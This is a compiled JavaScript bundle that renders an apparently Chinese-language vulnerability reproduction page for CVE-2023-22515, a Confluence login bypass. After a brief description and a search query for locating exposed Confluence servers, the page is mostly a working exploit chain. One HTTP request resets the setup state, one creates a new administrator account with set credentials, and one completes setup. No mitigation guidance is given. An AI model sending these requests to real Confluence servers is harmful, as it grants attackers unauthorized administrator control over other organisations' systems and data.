(window.webpackJsonp=window.webpackJsonp||[]).push([[145],{2112:function(s,t,a){s.exports=a.p+"assets/img/1630488806824-a8205673-933b-434b-8050-abcde3ef3e97-9159064.1bb2f62c.png"},2113:function(s,t,a){s.exports=a.p+"assets/img/1697624725476-31dd0dd6-1d0a-4542-bafe-3ab5097a7bb5.cad0de13.png"},2114:function(s,t,a){s.exports=a.p+"assets/img/1697624750262-a2d22c1e-b935-4ce4-9d39-105074f54914.8674936a.png"},2115:function(s,t,a){s.exports=a.p+"assets/img/1697624779864-7545cb71-80b8-4698-ba28-fa62df4918df.7b745e38.png"},3328:function(s,t,a){"use strict";a.r(t);var n=a(65),r=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"atlassian-confluence-server-info-action-登陆绕过漏洞-cve-2023-22515"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#atlassian-confluence-server-info-action-登陆绕过漏洞-cve-2023-22515"}},[s._v("#")]),s._v(" Atlassian Confluence server-info.action 登陆绕过漏洞 CVE-2023-22515")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Atlassian Confluence 是 Atlassian 开发的一款建基于网络企业维基 (collaboration software) 的软件。Atlassian Confluence 数据中心和服务器存在漏洞，利用 /server-info.action 端点传递 bootstrapStatusProvider.applicationConfig.setupComplete 参数，使服务器处于安装未完成状态，以访问受限制的端点并创建未经授权的 Confluence 管理员帐户，登录 Confluence 实例后台。")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Atlassian Confluence")]),t("br"),s._v(" "),t("h2",{attrs:{id:"网络测绘"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v('app="ATLASSIAN-Confluence"')]),t("br"),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("登录页面")]),s._v(" "),t("p",[t("img",{attrs:{src:a(2112),alt:"img"}})]),s._v(" "),t("p",[s._v("验证POC")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("GET")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("server"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("info"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("action"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("bootstrapStatusProvider"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("applicationConfig"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("setupComplete"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token constant boolean"}},[s._v("false")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nAccept"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\nContent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("x"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("www"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("form"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("urlencoded\n"),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("X")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Atlassian"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Token"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" no"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("check\nAccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" gzip\nUser"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Mozilla"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("NT")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Win64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" x64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("KHTML")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("113.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),s._v(" Safari"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2113),alt:"img"}})]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("setup"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("setupadministrator"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("action "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nContent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("x"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("www"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("form"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("urlencoded\n"),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("X")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Atlassian"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Token"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" no"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("check\nAccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" gzip\nUser"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Mozilla"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("NT")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Win64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" x64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("KHTML")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("113.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),s._v(" Safari"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nAccept"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\nContent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Length"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("126")]),s._v("\n\nusername"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("bbvpe4mk"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("fullName"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("bbvpe4mk"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("email"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("bbvpe4mk@localhost"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("password"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v("wg6pm6sP123"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("confirm"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),s._v("wg6pm6sP123"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("setup"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("next"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("button"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Next\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2114),alt:"img"}})]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("GET")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("setup"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("finishsetup"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("action "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nContent"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("x"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("www"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("form"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("urlencoded\n"),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("X")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Atlassian"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Token"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" no"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("check\nAccept"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" gzip\nUser"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Mozilla"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Windows "),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("NT")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" Win64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" x64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" AppleWebKit"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token constant"}},[s._v("KHTML")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" Chrome"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("113.0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v(".0")]),s._v(" Safari"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nAccept"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br")])]),t("p",[t("img",{attrs:{src:a(2115),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);